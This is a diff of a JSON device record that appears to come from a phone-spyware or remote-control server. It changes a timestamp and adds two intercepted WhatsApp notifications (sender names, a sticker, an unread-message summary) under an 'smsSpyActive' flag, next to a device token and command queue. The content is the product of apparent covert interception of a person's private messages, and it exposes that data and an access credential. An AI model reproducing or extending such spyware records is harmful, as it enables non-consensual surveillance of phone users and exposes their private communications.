@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777173016312,
+    "lastSeen": 1777173019510,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (123 pesan): ~ ANGGA TUKAM",
+        "content": "💟 Stiker",
+        "time": "26/04 11:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173019819
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1091 pesan dari 19 chat",
+        "time": "26/04 11:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173016778
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (122 pesan): ~ ANGGA TUKAM",
